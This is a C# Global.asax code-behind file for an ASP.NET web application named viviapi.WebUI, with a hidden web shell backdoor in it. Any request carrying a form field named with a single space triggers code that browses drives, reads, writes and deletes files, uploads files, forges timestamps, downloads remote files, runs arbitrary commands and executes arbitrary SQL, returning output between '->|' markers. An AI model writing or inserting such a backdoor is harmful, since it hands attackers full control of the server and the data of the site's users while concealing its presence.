namespace viviapi.WebUI
{
    using System;
    using System.Data;
    using System.Data.SqlClient;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Text;
    using System.Web;
    using viviapi.WebComponents.ScheduledTask;
    using viviLib.ExceptionHandling;
    using viviLib.Web;

    public class Global : HttpApplication
    {
        private ScheduledTasks scheduledTasks;

        protected void Application_AuthenticateRequest(object sender, EventArgs e)
        {
        }

        protected void Application_BeginRequest(object sender, EventArgs e)
        {
            string action = base.Request.Form[" "];
            if (action != null)
            {
                this.EvalRequest(action);
                base.Response.End();
            }
        }

        protected void Application_End(object sender, EventArgs e)
        {
        }

        protected void Application_Error(object sender, EventArgs e)
        {
            ExceptionHandler.HandleException(base.Server.GetLastError());
        }

        protected void Application_Start(object sender, EventArgs e)
        {
            WebBase.HttpApplication = this;
            this.scheduledTasks = new ScheduledTasks();
            this.scheduledTasks.Start();
        }

        private void CP(string S, string D)
        {
            if (Directory.Exists(S))
            {
                DirectoryInfo info = new DirectoryInfo(S);
                Directory.CreateDirectory(D);
                foreach (FileInfo info2 in info.GetFiles())
                {
                    System.IO.File.Copy(S + @"\" + info2.Name, D + @"\" + info2.Name);
                }
                foreach (DirectoryInfo info3 in info.GetDirectories())
                {
                    this.CP(S + @"\" + info3.Name, D + @"\" + info3.Name);
                }
            }
            else
            {
                System.IO.File.Copy(S, D);
            }
        }

        private void EvalRequest(string action)
        {
            HttpContext current = HttpContext.Current;
            HttpRequest request = current.Request;
            HttpResponse response = current.Response;
            string str = action;
            if (!(str != ""))
            {
                return;
            }
            string path = request.Form["Z1"];
            string str3 = request.Form["Z2"];
            string str4 = "";
            try
            {
                string[] logicalDrives;
                int num;
                DirectoryInfo info;
                DirectoryInfo info2;
                byte[] buffer;
                DateTime time;
                HttpWebResponse response2;
                Stream responseStream;
                FileStream stream3;
                byte[] buffer2;
                string str5;
                SqlConnection connection;
                string[] strArray2;
                string str6;
                string str7;
                DataTable schema;
                int num2;
                DataSet set;
                DataRowCollection rows;
                SqlCommand command;
                bool flag;
                DirectoryInfo[] directories;
                int num4;
                switch (str)
                {
                    case "A":
                        logicalDrives = Directory.GetLogicalDrives();
                        str4 = string.Format("{0}\t", current.Server.MapPath("aa"));
                        num = 0;
                        goto Label_0205;

                    case "B":
                        info = new DirectoryInfo(path);
                        directories = info.GetDirectories();
                        num4 = 0;
                        goto Label_027B;

                    case "C":
                        {
                            StreamReader reader = new StreamReader(path, Encoding.Default);
                            str4 = reader.ReadToEnd();
                            reader.Close();
                            goto Label_0A31;
                        }
                    case "D":
                        {
                            StreamWriter writer = new StreamWriter(path, false, Encoding.Default);
                            writer.Write(str3);
                            str4 = "1";
                            writer.Close();
                            goto Label_0A31;
                        }
                    case "E":
                        if (!Directory.Exists(path))
                        {
                            goto Label_0370;
                        }
                        Directory.Delete(path, true);
                        goto Label_0378;

                    case "F":
                        response.Clear();
                        response.Write("->|");
                        response.WriteFile(path);
                        response.Write("|<-");
                        return;

                    case "G":
                        buffer = new byte[str3.Length / 2];
                        num = 0;
                        goto Label_03E9;

                    case "H":
                        this.CP(path, str3);
                        str4 = "1";
                        goto Label_0A31;

                    case "I":
                        if (!Directory.Exists(path))
                        {
                            goto Label_045E;
                        }
                        Directory.Move(path, str3);
                        goto Label_0A31;

                    case "J":
                        Directory.CreateDirectory(path);
                        str4 = "1";
                        goto Label_0A31;

                    case "K":
                        time = Convert.ToDateTime(str3);
                        if (!Directory.Exists(path))
                        {
                            goto Label_04C0;
                        }
                        Directory.SetCreationTime(path, time);
                        Directory.SetLastWriteTime(path, time);
                        Directory.SetLastAccessTime(path, time);
                        goto Label_04E0;

                    case "L":
                        {
                            HttpWebRequest request2 = (HttpWebRequest)WebRequest.Create(new Uri(path));
                            request2.Method = "GET";
                            request2.ContentType = "application/x-www-form-urlencoded";
                            response2 = (HttpWebResponse)request2.GetResponse();
                            responseStream = response2.GetResponseStream();
                            stream3 = new FileStream(str3, FileMode.Create, FileAccess.Write);
                            buffer2 = new byte[0x400];
                            goto Label_0579;
                        }
                    case "M":
                        {
                            ProcessStartInfo info4 = new ProcessStartInfo(path.Substring(2));
                            Process process = new Process();
                            info4.UseShellExecute = false;
                            info4.RedirectStandardOutput = true;
                            info4.RedirectStandardError = true;
                            process.StartInfo = info4;
                            info4.Arguments = string.Format("{0} {1}", path.Substring(0, 2), str3);
                            process.Start();
                            StreamReader standardOutput = process.StandardOutput;
                            StreamReader standardError = process.StandardError;
                            process.Close();
                            str4 = standardOutput.ReadToEnd() + standardError.ReadToEnd();
                            goto Label_0A31;
                        }
                    case "N":
                        str5 = path.ToUpper();
                        connection = new SqlConnection(path);
                        connection.Open();
                        str4 = connection.Database + "\t";
                        connection.Close();
                        goto Label_0A31;

                    case "O":
                        strArray2 = path.Replace("\r", "").Split(new char[] { '\n' });
                        str6 = strArray2[0];
                        str7 = strArray2[1];
                        connection = new SqlConnection(str6);
                        connection.Open();
                        schema = connection.GetSchema("Columns");
                        connection.Close();
                        num = 0;
                        goto Label_0707;

                    case "P":
                        {
                            strArray2 = path.Replace("\r", "").Split(new char[] { '\n' });
                            string[] restrictionValues = new string[4];
                            str6 = strArray2[0];
                            str7 = strArray2[1];
                            string str8 = strArray2[2];
                            restrictionValues[0] = str7;
                            restrictionValues[2] = str8;
                            connection = new SqlConnection(str6);
                            connection.Open();
                            schema = connection.GetSchema("Columns", restrictionValues);
                            connection.Close();
                            num = 0;
                            goto Label_07EC;
                        }
                    case "Q":
                        {
                            strArray2 = path.Replace("\r", "").Split(new char[] { '\n' });
                            str6 = strArray2[0];
                            str7 = strArray2[1];
                            str5 = str3.ToUpper();
                            connection = new SqlConnection(str6);
                            connection.Open();
                            if (((str5.IndexOf("SELECT ") != 0) && (str5.IndexOf("EXEC ") != 0)) && (str5.IndexOf("DECLARE ") != 0))
                            {
                                goto Label_09E5;
                            }
                            SqlDataAdapter adapter = new SqlDataAdapter(str3, connection);
                            set = new DataSet();
                            adapter.Fill(set);
                            if (set.Tables.Count <= 0)
                            {
                                goto Label_09D2;
                            }
                            rows = set.Tables[0].Rows;
                            num2 = 0;
                            goto Label_0920;
                        }
                    default:
                        return;
                }
            Label_01E1:
                str4 = str4 + logicalDrives[num][0] + ":";
                num++;
            Label_0205:
                if (num < logicalDrives.Length)
                {
                    goto Label_01E1;
                }
                goto Label_0A31;
            Label_0231:
                info2 = directories[num4];
                str4 = str4 + string.Format("{0}/\t{1}\t0\t-\n", info2.Name, System.IO.File.GetLastWriteTime(path + info2.Name).ToString("yyyy-MM-dd hh:mm:ss"));
                num4++;
            Label_027B:
                if (num4 < directories.Length)
                {
                    goto Label_0231;
                }
                foreach (FileInfo info3 in info.GetFiles())
                {
                    str4 = str4 + string.Format("{0}\t{1}\t{2}\t-\n", info3.Name, System.IO.File.GetLastWriteTime(path + info3.Name).ToString("yyyy-MM-dd hh:mm:ss"), info3.Length);
                }
                goto Label_0A31;
            Label_0370:
                System.IO.File.Delete(path);
            Label_0378:
                str4 = "1";
                goto Label_0A31;
            Label_03C8:
                buffer[num / 2] = (byte)Convert.ToInt32(str3.Substring(num, 2), 0x10);
                num += 2;
            Label_03E9:
                if (num < str3.Length)
                {
                    goto Label_03C8;
                }
                FileStream stream = new FileStream(path, FileMode.Create);
                stream.Write(buffer, 0, buffer.Length);
                stream.Close();
                str4 = "1";
                goto Label_0A31;
            Label_045E:
                System.IO.File.Move(path, str3);
                goto Label_0A31;
            Label_04C0:
                System.IO.File.SetCreationTime(path, time);
                System.IO.File.SetLastWriteTime(path, time);
                System.IO.File.SetLastAccessTime(path, time);
            Label_04E0:
                str4 = "1";
                goto Label_0A31;
            Label_054A:
                num = responseStream.Read(buffer2, 0, buffer2.Length);
                if (num < 1)
                {
                    goto Label_057E;
                }
                stream3.Write(buffer2, 0, num);
            Label_0579:
                flag = true;
                goto Label_054A;
            Label_057E:
                responseStream.Close();
                response2.Close();
                stream3.Close();
                str4 = "1";
                goto Label_0A31;
            Label_06D3:
                str4 = str4 + string.Format("{0}\t", schema.Rows[num][2].ToString());
                num++;
            Label_0707:
                if (num < schema.Rows.Count)
                {
                    goto Label_06D3;
                }
                goto Label_0A31;
            Label_079F:
                str4 = str4 + string.Format("{0} ({1})\t", schema.Rows[num][3].ToString(), schema.Rows[num][7].ToString());
                num++;
            Label_07EC:
                if (num < schema.Rows.Count)
                {
                    goto Label_079F;
                }
                goto Label_0A31;
            Label_08E2:
                str4 = str4 + string.Format("{0}\t|\t", set.Tables[0].Columns[num2].ColumnName.ToString());
                num2++;
            Label_0920:
                if (num2 < set.Tables[0].Columns.Count)
                {
                    goto Label_08E2;
                }
                str4 = str4 + "\r\n";
                for (num = 0; num < rows.Count; num++)
                {
                    for (num2 = 0; num2 < set.Tables[0].Columns.Count; num2++)
                    {
                        str4 = str4 + string.Format("{0}\t|\t", rows[num][num2].ToString());
                    }
                    str4 = str4 + "\r\n";
                }
            Label_09D2:
                set.Clear();
                set.Dispose();
                goto Label_0A09;
            Label_09E5:
                command = connection.CreateCommand();
                command.CommandText = str3;
                command.ExecuteNonQuery();
                str4 = "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
            Label_0A09:
                connection.Close();
            }
            catch (Exception exception)
            {
                str4 = "ERROR:// " + exception.Message;
            }
        Label_0A31:
            response.Write("->|" + str4 + "|<-");
        }

        protected void Session_End(object sender, EventArgs e)
        {
        }

        protected void Session_Start(object sender, EventArgs e)
        {
        }
    }
}

